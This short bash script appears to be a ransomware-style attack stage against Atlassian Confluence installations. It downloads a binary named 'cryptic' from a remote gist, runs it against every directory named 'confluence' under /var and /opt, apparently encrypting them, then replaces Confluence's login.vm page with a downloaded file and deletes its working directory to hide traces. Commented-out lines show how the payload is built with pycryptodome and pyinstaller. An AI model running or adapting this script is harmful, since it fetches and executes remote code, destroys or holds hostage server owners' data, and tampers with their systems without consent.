#!/bin/bash

# # Set up Pre-requisites
# apt-get update
# apt-get install zlib1g-dev
# apt-get install python3
# apt-get install python3-pip
# pip3 install pycryptodome==3.15.0
# pip3 install pyinstaller

# # Compile binary
# curl -L https://gist.github.com/donovancham/d1078240bdc8108e03de68d83594603e/raw/003d4ecfcb9a0b468c02af72f495e90b6a2fd01e/cryptic.py > cryptic.py
# pyinstaller cryptic.py --onefile

# Download payload
mkdir /tmp/cryptic
cd /tmp/cryptic
curl -L https://gist.github.com/donovancham/d1078240bdc8108e03de68d83594603e/raw/003d4ecfcb9a0b468c02af72f495e90b6a2fd01e/cryptic > cryptic

# Attack phase (Find with name 'confluence' in /var and /opt)
chmod +x cryptic
./cryptic $(find /var -name "confluence" -print) $(find /opt -name "confluence" -print)
curl -L https://gist.github.com/donovancham/d1078240bdc8108e03de68d83594603e/raw/838ec50adc8e8b901a4a35b6bc3c72bf8357a8cc/login.vm > /opt/atlassian/confluence/confluence/login.vm

# Cleanup
cd /
rm -rf /tmp/cryptic